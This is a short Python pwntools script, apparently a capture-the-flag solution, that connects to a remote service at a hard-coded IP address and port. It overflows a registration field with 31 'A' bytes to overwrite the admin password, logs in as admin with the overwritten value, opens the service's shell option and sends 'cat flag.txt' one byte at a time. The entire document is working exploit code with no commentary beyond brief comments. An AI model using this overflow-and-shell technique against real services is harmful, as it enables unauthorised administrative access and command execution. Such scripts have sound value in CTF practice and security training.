from pwn import *

p = remote('140.113.207.245', 30172)

# Register a user account, and overflow to admin password
print(p.recvuntil(b'Enter Your Action\n> ').decode())  

p.sendline(b'2')  
print(p.recvuntil(b'> ').decode())  
p.sendline(b'A'*31)  
print(p.recvuntil(b'> ').decode())
p.send(b'\n')  


# Login as Admin
print(p.recvuntil(b'Enter Your Action\n> ').decode()) 

p.sendline(b'1') 
print(p.recvuntil(b'> ').decode())  
p.sendline(b'admin')
print(p.recvuntil(b'> ').decode()) 
p.sendline(b'A'*15) 


# Execute the shell 
print(p.recvuntil(b'Enter Your Action\n> ').decode())

p.sendline(b'3')  
print(p.recvuntil(b'> ').decode()) 

command = b'cat flag.txt\n'
for byte in command:
    p.send(bytes([byte]))
    time.sleep(0.05)


print(p.recvall(timeout=0.2).decode())
p.close()
